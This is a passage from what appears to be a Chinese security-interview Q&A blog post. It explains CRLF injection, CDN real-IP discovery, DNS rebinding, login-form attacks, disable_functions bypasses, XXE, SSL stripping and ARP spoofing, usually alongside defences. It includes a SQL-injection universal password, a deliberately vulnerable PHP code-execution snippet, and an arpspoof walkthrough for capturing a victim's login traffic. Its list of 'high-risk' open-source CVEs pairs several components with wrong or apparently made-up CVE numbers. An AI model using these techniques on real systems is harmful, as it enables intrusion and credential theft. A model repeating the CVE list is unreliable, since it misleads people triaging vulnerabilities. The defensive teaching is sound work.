$arg&quot;);</code><br>系统漏洞造成命令注入：如bash破壳漏洞<br>调用的第三方组件存在代码执行漏洞：如thinkphp5.x的命令执行</p><p>SQL注入<br>OS命令注入<br>LDAP注入<br>JNDI注入</p><ol start="2"><li>命令执行漏洞原理<br>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：system()、exec()、shell_exec()、eval()、passthru()，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</li></ol><h1 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h1><ol><li>CRLF注入原理。</li></ol><p>CRLF(Carriage-Return Line-Feed 回车换行)，用字符表示即为 <code>\r\n</code><br>在http当中http的header和body之间就是用两个crlf进行分隔的。如果能控制http消息头中的字符，注入一些恶意的换行，这样就能注入一些会话cookie和html代码，所以CRLF Injection又叫做HTTP Response Splitting(HTTP响应拆分漏洞，简称HRS)，CRLF漏洞可以造成 Cookie会话固定 和 反射型XSS(可过WAF) 的危害。<br>注入XSS的利用方式：连续使用两次%0d%0a就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p><p>HRS漏洞存在的前提是：url当中输入的字符会影响到文件，比如在重定位当中可以尝试使用%0d%0a作为crlf。<br>一般网站会在HTTP头中加入 <code>Location: http://example.com</code> 的方式来进行302跳转，所以我们能控制的内容就是Location后面的网址，对这个地址进行污染。</p><p>原理：类似于XSS，利用Web应用程序对CRLF结束标记进行欺骗的攻击手法。当未对HTTP参数或URL进行过滤时，攻击者通过在HTTP协议头中注入恶意的CRLF字符，欺骗web服务器将请求分割为两个部分，其中第二部分被认为是新的请求。导致攻击者在新的HTTP请求中注入恶意代码，例如恶意重定向，cookie欺骗，会话劫持等。</p><ol start="2"><li>如何绕过CDN获取目标网站真实IP？</li></ol><p>CDN(Content Delivery Network，内容分发网络)是一种通过在多个地理位置部署服务器来缓存静态内容（如图片、CSS、Javascript、HTML等）并提供更快的访问速度的技术。CDN可以保护网站免受攻击，但也可能会导致攻击者无法获取目标网站的真实IP。<br>绕过CDN获取目标网站真实IP的方法：<br>(1) 利用DNS历史解析记录。CDN通常会将目标网站的域名解析到多个CDN节点的IP地址。如果目标网站以前没有使用CDN，那么在DNS历史解析记录中可能仍会保留其真实的IP地址。相关查询网站： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iphistory: https://viewdns.info/iphistory/</span><br><span class="line">DNS查询: https://dnsdb.io/zh-cn/</span><br><span class="line">微步在线: https://x.threatbook.cn/</span><br><span class="line">域名查询: https://site.ip138.com/</span><br><span class="line">DNS历史查询: https://securitytrails.com/</span><br><span class="line">Netcraft: https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure><p>(2) 查询子域名。CDN通常只会将目标网站的主域名解析到CDN节点的IP地址。如果目标网站有多个子域名，那么其中某些子域名可能没有使用CDN。子域名查找方法和工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">搜索引擎查询：如Google。使用语法类似于 site:baidu.com  inurl:baidu.com，搜目标名字</span><br><span class="line">在线查询工具：</span><br><span class="line">如: https://tool.chinaz.com/sudbdomain/  https://i.links.cn/subdomain/ </span><br><span class="line">https://subdomain.chaxun.la/  https://searchdns.netcraft.com/  https://www.virustotal.com/</span><br><span class="line">子域名爆破工具: </span><br><span class="line">Layer子域名挖掘机  wydomain：https://github.com/ring04h/wydomain  </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/  Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure><p>(3) 网站邮件头信息。比如邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，由于一般的邮件系统在内部，未经过CDN解析，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p><p>(4) 网络空间安全引擎搜索。通过关键字或网站域名，找出被收录的IP，有时获取到的就是网站的真实IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">钟馗之眼： https://www.zoomeye.org</span><br><span class="line">Shodan: https://www.shodan.io</span><br><span class="line">Fofa: https://fofa.so</span><br><span class="line">ZoomEye: https://www.zoomeye.org/</span><br></pre></td></tr></table></figure><p>(5) 利用SSL证书寻找真实IP。证书颁发机构(CA)必须将他们发布的每个SSL&#x2F;TLS证书发布到公共日志中，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。因此SSL&#x2F;TLS证书成为了攻击者的切入点。<br>步骤：访问网站，在地址栏查看网址的SSL证书(锁型图标)。复制SSL证书的SHA1指纹，SHA1指纹是用于识别证书的唯一标识符。将SHA1指纹粘贴到SSL证书搜索工具中，可使用Censys或SSL Labs等工具。搜索结果将显示网站的真实ip地址，大多数情况下真实IP地址与SSL证书中的IP地址相同。注意某些网站可能会用多个IP地址或CDN来托管其网站。<br>(6) 国外主机解析域名。国外多ping测试工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://asm.ca.com/zh_cn/ping.php</span><br><span class="line">http://host-tracker.com/</span><br><span class="line">http://www.webpagetest.org/</span><br><span class="line">https://dnscheck.pingdom.com/</span><br></pre></td></tr></table></figure><p>(7) 扫描全网。通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Zmap: https://github.com/zmap/zmap</span><br><span class="line">Masscan: https://github.com/robertdavidgraham/masscan</span><br></pre></td></tr></table></figure><p>(8) 配置不当导致绕过。在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。<br>案例1：为了方便用户访问，我们常常将 <code>www.test.com</code> 和 <code>test.com</code> 解析到同一个站点，而CDN只配置了 <code>www.test.com</code> ，通过访问 <code>test.com</code> ，就可以绕过 CDN 了。<br>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p><ol start="3"><li>列举你所知道的所有开源组件高危漏洞（10个以上）</li></ol><p>(1) Log4j 2 远程代码执行漏洞(CVE-2021-44228):该漏洞影响了Log4j 2 所有版本，可被利用来执行任意代码。<br>(2) Spring Core RCE漏洞(CVE-2022-22965): Spring Framework远程代码执行漏洞<br>(3) Spring Boot RCE漏洞(CVE-2022-22963): Spring Cloud Function存在SPEL表达式注入漏洞<br>(4) Fastjson 反序列化漏洞(CVE-2022-22947): Spring Cloud Gateway远程代码执行漏洞<br>(5) Apache Struts2 反序列化漏洞（CVE-2022-0338）<br>(6) Apache Commons Collections 反序列化漏洞（CVE-2022-22960）<br>(7) Apache Commons FileUpload 反序列化漏洞（CVE-2022-22959）<br>(8) Apache Commons BeanUtils 反序列化漏洞（CVE-2022-22958）<br>(9) Jenkins 远程代码执行漏洞（CVE-2022-0241）<br>(10) Apache Tomcat 远程代码执行漏洞（CVE-2022-22966）<br>(11) Apache Shiro 远程代码执行漏洞（CVE-2022-22967）<br>(12) Spring Data Commons SQL 远程代码执行漏洞（CVE-2022-22964）<br>(13) Spring Boot Starter Data JPA 远程代码执行漏洞（CVE-2022-22962）<br>(14) Apache Log4j SQL注入漏洞(CVE-2022-23305)</p><ol start="4"><li>服务器为IIS+PHP+MySQL，发现root权限注入漏洞，讲讲你的渗透思路。</li></ol><p>可以读取IIS信息，知道路径，如果像WAMMP类似构建，通过@@datadir知道数据库路径也可以猜测网站路径。<br>或者直接写shell</p><ol start="5"><li>下面这段代码存在漏洞吗？如果存在请说出存在什么漏洞并利用。<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//www.exp.com/1.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$s_func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;s_func&#x27;</span>];</span><br><span class="line"><span class="variable">$info</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;info&#x27;</span>];</span><br><span class="line"><span class="variable">$s_func</span>(<span class="variable">$info</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><p>代码执行，通过assert调用。</p><ol start="6"><li>说出至少三种业务逻辑漏洞，以及修复方式？</li></ol><p>密码找回漏洞存在<br>(1) 密码允许暴力破解<br>(2) 存在通用型找回凭证<br>(3) 可以跳过验证步骤<br>(4) 找回凭证可以拦包获取<br>等方式来通过厂商提供的密码找回功能来得到密码。</p><p>身份认证漏洞中最常见的是<br>(1) 会话固定攻击<br>(2) Cookie仿冒</p><p>只要得到Session或Cookie即可伪造用户身份。验证码漏洞中存在<br>验证码允许暴力破解<br>验证码可以通过JavaScript或者改包的方式来进行绕过</p><ol start="7"><li>DNSRebinding</li></ol><p>DNS重绑定利用DNS绕过浏览器的同源策略。<br>攻击原理：攻击者首先控制一个域名，并将其指向一个恶意网站；然后使用恶意网站上的脚本诱导用户访问该域名；当用户访问时浏览器会将其解析为攻击者的IP地址；攻击者然后将域名的IP地址重绑定到另一个IP地址，该IP地址指向一个内网中的服务器；当用户再次访问该域名时，浏览器会使用攻击者重绑定的IP地址；由于浏览器认为这两个IP地址是同源的，因此恶意脚本可以访问内网中的服务器。<br>DNS重绑定攻击可以用来窃取敏感数据，例如用户名、密码和信用卡信息。它还可以用来执行恶意代码，例如安装恶意软件或控制受感染的设备。<br>防御：通过控制2次的DNS查询请求的间隔低于TTL值,确保两次查询的结果一致。写一个请求判断,Linux系统修改默认的TTL值为10,即可很轻松解决这个问题。使用 DNS 安全扩展 (DNSSEC)，该扩展可以防止 DNS 欺骗。<br><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p><p>1、攻击者设置恶意DNS服务器： 攻击者首先设置一个恶意的DNS服务器，该服务器会向受害者返回虚假的DNS记录。这些DNS记录通常指向攻击者的恶意服务器，而不是实际目标服务器。<br>2、受害者访问受信任的网站： 受害者在其浏览器中访问一个受信任的网站，该网站可能包含一些恶意的内容或利用漏洞。通常，这个受信任的网站包含了引用了攻击者的恶意域名的JavaScript代码。<br>3、恶意JavaScript执行： 受害者的浏览器执行了来自受信任网站的恶意JavaScript代码，该代码尝试在后台加载攻击者的恶意域名。浏览器会尝试解析恶意域名的IP地址，为此会发起DNS查询。<br>4、DNS重绑定： 浏览器向恶意DNS服务器发起DNS查询请求，攻击者的DNS服务器会返回一个虚假的DNS记录，将攻击者的恶意服务器的IP地址与恶意域名绑定。一旦浏览器获得了虚假的IP地址，它会发起与攻击者服务器的连接，从而执行攻击者所期望的操作。<br>5、攻击执行： 一旦浏览器与攻击者服务器建立了连接，攻击者可以执行各种恶意操作，例如窃取用户信息、执行未经授权的操作等。</p><ol start="8"><li>登录框攻击面</li></ol><p>错误信息判断：不同用户名或密码错误信息不同，可以暴力破解。修复方案是将错误信息改为一致。<br>弱口令：暴力破解。修复方案是禁用弱口令。<br>空口令：直接登录。修复方案是判断密码为空禁止空口令登录。<br>登录认证绕过：少数可禁用js绕过登录认证，也有少部分通过burp抓包改包登录绕过。修复方案是不用前端认证，增加验证码，密码通过加密算法加密，失败多次加锁，密码强度增加。<br>存在暴力破解：社工手段。修复方案：增加验证码，密码通过加密算法加密，失败多次加锁，密码强度增加。<br>图形验证码不失效：输入特殊字符可能绕过或验证码使用后未刷新。修复方案：验证码识别后销毁session中的验证码，限制用户提交的验证码不能为空，判断提交的验证码与服务器上存储的是否一致。<br>短信验证码绕过：某些网站使用手机短信登录，短信验证码可被绕过或验证码过短被爆破。修复方案：若存在特权验证码，建议删除；服务端严格校验验证码参数是否为空，格式是否正确；关键操作每提交一次请求，应发送新的短信验证码，旧的不可使用。<br>短信验证码可暴力破解：位数太短或有效期太长。修复方案：短信验证码不少于6位，有效期不超过1分钟，验证码错误次数上限锁定账户。<br>短信轰炸：发送数据包重放，若服务器短信平台未做校验，系统会一直发短信，造成短信轰炸，连续收到10条以上短信即可验证。修复方案：后端配置同一手机号发送次数不超过3-5次，对间隔时间做限制；前端禁止同一手机号进行次数大于5的发送，加入验证码功能，限制发送时间间隔。<br>恶意锁定问题：不断输入错误的密码恶意锁定任意账号。修复方案：账户锁定之后应不能继续使用认证功能。认证功能防自动化操作，如添加图形验证码。<br>密码明文传输：敏感数据未加密。修复方案：使用加密方式传输，如HTTPS，但可能会影响用户体验。也可用前端js加密后再传输。<br>反射型跨站脚本攻击：可对页面提交参数处进行测试。修复方案：输入验证，输出编码，黑白名单结合。<br>万能密码：诸如 <code>admin&#39;or 1=1 #</code> 。修复方案：web应用防火墙。<br>sql注入：不多说。修复方案：略。<br>任意用户密码修改&#x2F;重置：篡改用户名或id、暴力破解验证码等方式修改或重置任意账户密码。修复方案：及时对请求的用户身份与当前登录的用户身份进行校验，判断是否有权修改用户的密码并对原始密码是否正确进行正确判断；对原始密码进行了验证的情况下，限制输入原始密码的错误次数，防止攻击者暴力破解原始密码；重置密码链接中的关键信息应随机化，不可预测(如token)，且禁止将关键信息返回到客户端。<br>目录遍历：输入类似于 <code>../../</code> 或通过御剑进行目录扫描。修复方案：IIS中关闭目录浏览功能，在IIS的网站属性中，勾去目录浏览选项，重启IIS；Apache中关闭目录浏览功能，打开Apache配置文件中的httpd.conf，查找“Options Indexs FollowSymLinks”，修改为“ Options -Indexes”(减号表示取消，保存退出，重启Apache；Nginx中默认不会开启目录浏览功能，若您发现当前已开启该功能，可以编辑nginx.conf文件，删除如下两行：autoindex on;autoindex_exact_size on;重启Nginx。<br>敏感文件信息泄露：爬虫扫描或手工挖掘查看源代码。修复方案：重要代码注意加密保护或隐藏。</p><ol start="9"><li>getshell的姿势</li></ol><p>两篇参考文章：<br><a href="https://blog.csdn.net/m0_53087192/article/details/112779349">各种Getshell姿势总结</a><br><a href="https://www.freebuf.com/articles/web/258229.html">GetShell的姿势总结</a></p><ol start="10"><li>DNS重绑定，利用</li></ol><p>见问题7</p><ol start="11"><li>disable function bypass</li></ol><p>(1) 黑名单绕过：查找漏网之鱼。如: <code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open</code><br>(2) 利用Windows组件COM绕过。查看 <code>com.allow_dcom</code> 是否开启,这个默认是不开启的。<br>(3) 利用pcntl_exec结合python反弹shell。使用条件是PHP安装并启用了pcntl插件。<br>(4) 利用LD_PRELOAD环境变量。通过环境变量LD_PRELOAD劫持系统函数。<br>(5) 利用ShellShock(CVE-2014-6271)。Bash破壳漏洞。<br>(6) 利用Apache Mod CGI<br>(7) 通过攻击PHP-FPM<br>(8) 利用GC UAF<br>(9) 利用Backtrace UAF<br>(10) Json Serializer UAF<br>(11) 利用SplDoublyLinkedList UAC<br>(12) 利用FFI扩展执行命令<br>(13) 利用ImageMagick</p><p><a href="https://www.freebuf.com/articles/network/263540.html">绕过Disable Functions来搞事情</a><br><a href="https://xz.aliyun.com/t/10057">bypass disable_functions姿势总结</a><br><a href="https://www.geekby.site/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/">常见Bypass Disable Functions方法</a></p><ol start="12"><li>写出你知道的逻辑漏洞</li></ol><p>按类型：<br>身份验证漏洞：暴力破解漏洞、Session固定攻击、cookie欺骗漏洞。<br>权限类逻辑漏洞：平行权限跨越、垂直权限跨越、未经授权访问。<br>图形验证码漏洞：图形验证码突破。<br>找回密码逻辑漏洞：密码找回漏洞。<br>业务数据篡改漏洞：业务数据篡改（赋值反冲）<br>执行顺序逻辑漏洞：执行顺序篡改。<br>其他类型逻辑漏洞：条件竞争漏洞、数据包重放漏洞、参数绑定漏洞。</p><p><a href="https://www.freebuf.com/vuls/281141.html">逻辑漏洞梳理与总结</a></p><ol start="13"><li>简述XXE的基本原理，以及如何去检测或判断blind XXE的存在</li></ol><p>XXE(XML External Entity Injection)，外部实体注入漏洞。攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>如何检测或判断Blind XXE存在：寻找XML输入点。比如Content-Type:text&#x2F;xml，post数据包含XML格式。将结果写入文件查看。</p><p>防御：完全禁用DTD，过滤用户提交的XML数据。</p><p>危害：<br>1、DOS攻击<br>2、SSRF攻击<br>3、使用file协议读取任意文件<br>4、端口探测<br>5、执行系统命令</p><ol start="14"><li>ARP攻击的原理(讲出具体流程)，如何发现并防御ARP攻击</li></ol><p>ARP协议没有真伪校验机制，因此网络中的攻击者可以通过伪造IP地址和MAC地址发出一些假报文来欺骗其它主机，能够在网络中产生大量的ARP通信量使网络阻塞，攻击者只要持续不断地发出伪造的ARP响应包就能更改目标主机ARP缓存中的IP-MAC条目，造成网络中断或中间人攻击。</p><p>具体流程：<br>PC1需要跟PC2通信，通过ARP请求包询问PC2的MAC地址，由于采用广播形式，所以交换机将ARP请求包从接口P1广播到P2和PC3。（注：交换机收到广播&#x2F;组播&#x2F;未知帧都会其他接口泛洪）<br>PC2根据询问信息，返回ARP单播回应包；此时PC3作为攻击者，没有返回ARP包，但是处于”监听”状态，为后续攻击做准备。<br>PC1和PC2根据ARP问答，将各自的ARP映射信息（IP-MAC）存储在本地ARP缓存表。<br>交换机根据其学习机制，记录MAC地址对应的接口信息，存储在CAM缓存表（也称为MAC地址表）。交换机收到数据包时，会解封装数据包，根据目标MAC字段进行转发。(ARP表遵循后到优先原则，攻击者只需源源不断发送IP-MAC的ARP回应包即可。)</p><p>防御：<br>使用HTTPS加密协议：<br>ARP静态绑定：在路由和终端上同时进行 IP 地址和 MAC 地址的绑定，相当于人工管理 ARP 缓存，自行维护 IP 地址和 MAC 地址的对应关系。但维护非常繁琐。换个网卡或 IP 地址，都需要重新修改配置。当流动电脑临时接入时，也要即时进行绑定，费时费力。<br>交换机端口绑定：跟双绑措施类似，只不过将 IP 和交换机端口进行绑定，缺点也是类似的。<br>PPPoE：使用 PPPoE 协议对网络流量进行二次封装，为每个用户都分配账号密码，上网时必须通过认证。这样 ARP 报文在一个认证的通道中传输，也就不会遭受攻击了。但 PPPoE 也不是完美的，由于二次封装的存在，传输效率会打些折扣。更严重的是，PPPoE 方式下局域网内无法互访。如果局域网内需要部署文件服务器、打印机，就有麻烦了。<br>启用ARP防火墙：ARP防火墙可以检测和阻断恶意的ARP报文，从而防止ARP攻击。<br>启用DHCP Snooping：DHCP Snooping 是一种交换机功能，可以阻止攻击者伪造 DHCP 报文来欺骗受害机器。</p><p><a href="https://zhuanlan.zhihu.com/p/28818627">图解ARP协议（二）ARP攻击篇</a></p><ol start="15"><li>SSL Strip（SSP）攻击到底是什么？</li></ol><p>SSL Strip(也叫HTTPS降级攻击)原理：为了剥离SSL，攻击者干预了HTTP到安全HTTPS协议的重定向，并拦截了用户到服务器的请求。然后，攻击者将继续在自己和服务器之间建立HTTPS连接，并与用户建立不安全的HTTP连接，充当他们的桥梁。<br>SSL Strip利用了大多数用户访问SSL的方式。大多数访问者连接到通过302重定向进行重定向的网站页面，或通过非SSL网站的连接到达SSL页面。<br>举例：受害者想打开网站 <code>www.example.com</code> ，则浏览器连接到攻击者机器，并等待服务器的响应。反过来，在SSL Strip中，攻击者将受害者的请求转发到example的服务器，并接收安全地HTTPS页面。例如: <code>https://www.example.com</code> 。此时，攻击者已经完全控制了页面。他将HTTPS降级为HTTP，然后将其发回到受害者的浏览器，现在浏览器将其重定向到 <code>http://www.example.com</code> ，受害者的所有信息将会纯文本格式传输，攻击者将能拦截它们。服务器认为已经建立安全连接，实际上确实建立了安全连接，只是连接到攻击者机器上。<br>实施方法：SSL Strip攻击最常见的方法是创建热点并允许受害者连接到该热点。采用与官方开放连接相似的热点名称来混淆伪造。假如麦当劳热点名称是“麦当劳”，那么攻击者可以将热点伪造为“麦当劳餐厅”。一旦用户尝试连接到服务器，攻击者便会使用对热点的控制来攻击用户。</p><p>防御措施：<br>(1) 启用HSTS。HSTS是一种安全策略，告诉浏览器在未来的访问中都使用HTTPS。缺点是用户首次访问不受HSTS保护，首次访问浏览器未收到HSTS。<br>(2) 使用HTTPS Everywhere。这是一个浏览器扩展，它会自动将所有网站的请求切换到HTTPS。<br>(3) 使用HTTPS强制传输。最有效。<br>(4) WIFI加密传输。<br>(5) 定期更新SSL证书。</p><p><a href="https://learnku.com/cs/t/42552">什么是 SSL Strip 攻击？</a><br><a href="https://glsakura.gitee.io/2020/04/02/%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E5%AE%8C%E6%95%B4%E7%9A%84%20SSLStrip%20%E6%94%BB%E5%87%BB/">如何进行一次完整的 SSLStrip 攻击</a></p><ol start="16"><li>中间人攻击–ARP欺骗原理、实战及防御</li></ol><p>ARP欺骗(Address Resolution Protocol Spoofing)原理是通过伪造或欺骗ARP协议的通信过程，使攻击者能够欺骗其它主机，使他们将数据发送到错误主机上，从而达到攻击者的目的。</p><p>在一个以太网中，当一台主机想要发送数据包给另一台主机时，它需要知道目标主机的MAC地址。<br>此时，发送方会发送一个ARP请求，请求目标主机的MAC地址。<br>目标主机会将自己的MAC地址发送回去，请求方则将其缓存到自己的ARP缓存中，以加快以后的通信。<br>攻击者会利用这个过程伪造自己的MAC地址，并向其他主机发送这种伪造的ARP请求，从而将目标主机的MAC地址指向攻击者的MAC地址。<br>这就使攻击者能够接收到目标主机发送的数据包，并可以选择是否转发或篡改这些数据，同时继续欺骗其他主机。</p><p>实战：<br>开始前更新kali下的软件列表，然后安装dsniff（用于自动化完成ARP欺骗）。<br>攻击机输入 <code>ifconfig</code> 查看内网IP，接着输入 <code>nbtscan -r 192.168.119.0/24</code> 扫描内网网段。<br>探测到了IP为192.168.119.131，名为HAIXIN-PC的受害机。检测网络连接正常。<br>接下来在攻击机中输入 <code>arpspoof -i eth0 -t 192.168.119.131 192.168.119.2</code> 开启ARP攻击，其中 <code>-i</code> 指定攻击机某张网卡来进行攻击， <code>-t</code> 第一个IP指定受害机的IP为内网网关（一般是路由）的IP，第一个参数可通过扫描确定，第二个参数可在攻击机中输入 <code>netstat -rn</code> 来查看。<br>通过以上措施可使目标机器断网。接下来要使kali具备类似路由的功能，将受害机发来的网络请求包转发给真实的网关，再由真实网关转发到外网，接收返回包的过程同理。<br>使用以下命令暂时开启kali的路由转发功能: <code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code> 。此时受害者机器网络连接正常说明路由转发功能已开启。<br>打开wireshark并选择之前进行arp欺骗的网卡。当受害者打开某个登录网页时，流量会被wireshark捕捉到，最终得到受害者信息</p><p>防御：<br>(1) 静态ARP绑定：将网络中的关键设备的MAC地址与其IP地址进行手动绑定，以防止攻击者发送虚假的ARP响应。这个方法对于关键服务器和网络设备非常有用，但需要定期维护。<br>(2) 网络监控和入侵检测系统（IDS&#x2F;IPS）：使用网络监控工具和入侵检测系统来检测异常ARP活动。这些系统可以监视并响应异常的ARP流量，例如大量的ARP请求或虚假的ARP响应。<br>(3) ARP检测工具：使用ARP检测工具来监视网络流量和ARP请求&#x2F;响应，以检测潜在的ARP欺骗攻击。这些工具可以警告管理员或自动采取措施来应对攻击。<br>(4) 网络隔离：将网络划分成多个子网，并使用防火墙和ACL（访问控制列表）来限制不同子网之间的流量。这有助于减少ARP欺骗攻击的影响范围。<br>(5) 端口安全性：在交换机上启用端口安全性功能，限制每个端口连接的设备数量，并只允许已知MAC地址的设备连接到端口。这可以防止未经授权的设备连接到网络。<br>(6) DHCP Snooping：启用DHCP Snooping功能，以确保DHCP分配的IP地址与相应的MAC地址匹配。这有助于减少攻击者通过伪造IP地址来进行ARP欺骗的可能性。<br>(7) 802.1X认证：使用802.1X认证来要求网络设备进行身份验证，然后再允许其访问网络。这可以防止未经授权的设备访问网络并进行ARP欺骗攻击。</p><p><a href="https://www.freebuf.com/articles/network/266951.html">中间人攻击之arp欺骗</a></p><ol start="17"><li>会话劫持原理</li></ol><p>会话劫持(Session Hijacking, 又名cookie劫持或cookie side-jacking)是一种网络攻击。攻击者通过窃取合法用户的会话ID，接管该用户的网络会话，从而获得该用户的权限。<br>原理：<br>首先要获取合法用户的ID。可通过钓鱼，监听网络流量，诱使用户点击恶意链接，利用应用程序漏洞。<br>攻击者获取到会话ID后，可以伪装成合法用户，向服务器发送请求。<br>服务器收到请求后，会将请求转发给合法用户。<br>攻击者可以通过接管合法用户的网络会话，获得该用户的权限。</p><ol start="18"><li>CC攻击</li></ol><p>CC攻击(Challenge Collapsar Attack)是一种拒绝服务攻击(DDoS)的一种，攻击者通过向受害者目标发送大量的请求，从而导致目标资源耗尽，无法正常提供服务。</p><p>原理：<br>(1) 攻击者首先要获取目标的IP地址和端口号。<br>(2) 攻击者使用CC攻击工具，向目标发送大量的请求。<br>(3) 目标收到请求后，会消耗大量的资源来处理这些请求。<br>(4) 当目标的资源耗尽后，将无法正常提供服务。</p><p>一般来说，CC攻击有两种方式进行：第一种方式是利用自己的机器对目标网站进行集中式攻击，目标网站接收到大量的访问请求后，服务器无法正常响应；第二种方式是通过使用大量的分散在各个地区、各个网络和主机上的代理程序或者“僵尸”计算机来攻击目标网站，这样作为攻击源的计算机会比较难以被记录下来。</p><p>危害：破坏服务(如网站，银行，电商等)，勒索(勒索目标，要求目标支付赎金)，宣传(宣传自己的网站或产品)，用户访问速度慢影响体验，长时间会造成搜索排名下降云服务器商清退。</p><p>防御：<br>(1) 使用CDN: 分散流量到多个服务器上，减轻单个服务器压力。<br>(2) 使用WAF: 过滤恶意请求。<br>(3) 使用CC防护服务: 措施是流量清洗，流量分发，DDoS防御。具体有云端CC防护(CloudFlare，阿里云，腾讯云，华为云)和本地CC防护。</p><p>特点：攻击量大，攻击目标广泛，防御难度大。</p><ol start="19"><li>添加时间戳防止重放攻击</li></ol><p>重放攻击(Replay Attack,或称回放攻击)是指攻击者截获了合法用户的请求，并将其重新发送给服务器，以达到冒充合法用户的目的。重放攻击可以用于盗取用户的账号信息、进行非法操作等。</p><p>添加时间戳可以防止重放攻击的原理是：服务器会在收到请求时，检查请求中的时间戳是否在有效范围内。如果时间戳过期，则认为该请求是重复请求，拒绝处理。</p><p>添加时间戳的方法：</p><ul><li>在请求头中添加时间戳：客户端在发送请求时，会在请求头中添加一个名为“timestamp”的时间戳参数，该参数的值为当前时间戳。服务器在收到请求时，会检查该参数的值是否在有效范围内。</li><li>在请求头中添加时间戳：类似于上。</li></ul><p>注意事项：<br>时间戳有效范围可以根据需求设置，一般设置为60s。<br>在服务器端，需要缓存时间戳，以便进行检查。</p><p>优缺点：<br>在客户端和服务端都需要进行修改。<br>时间戳的有效范围需要根据具体需求进行设置。</p><p>除了添加时间戳外，还可以：<br>使用nonce：nonce是一个随机数，每次请求会产生一个新的nonce。服务器会在收到请求时，检查nonce是否存在。nonce存在则认为请求是重复请求拒绝处理。<br>使用数字签名：客户端使用私钥对请求进行签名，服务器使用公钥验签。验签失败则认为是伪造的拒绝处理。</p><ol start="20"><li>https中间人攻击与证书校验</li></ol><p>HTTPS中间人攻击(Man-in-the-middle attack)是指攻击者在客户端和服务器之间建立了一个信任关系，从而可以拦截、修改或丢弃客户端发送给服务器或服务器发送给客户端的数据。<br>HTTPS中间人攻击的常用手段是伪造服务器证书。攻击者可以使用自己伪造的证书，或者使用被劫持的证书。</p><p>HTTPS证书校验的常见方法是：</p><ul><li>检查证书的颁发机构：是否为受信任的机构</li><li>检查证书的有效期：是否过期。</li><li>检查证书的域名：客户端会检查服务器证书的域名与客户端请求的域名相匹配。</li></ul><p>HTTPS强校验：指客户端不允许使用自签名证书或过期的证书。如果客户端检测到服务器使用了自签名证书或过期的证书，则会拒绝连接到该服务器。<br>HTTPS证书pinning：指客户端将服务器证书的哈希值保存到本地。如果检测到服务器证书的哈希值与本地保存的哈希值不匹配，则拒绝连接。<br><a href="https://www.cnblogs.com/jmilkfan-fanguiju/p/10589756.html">自建 CA 中心并签发 CA 证书</a><br><a href="https://zhuanlan.zhihu.com/p/59759209">HTTPS中间人攻击实践</a></p><ol 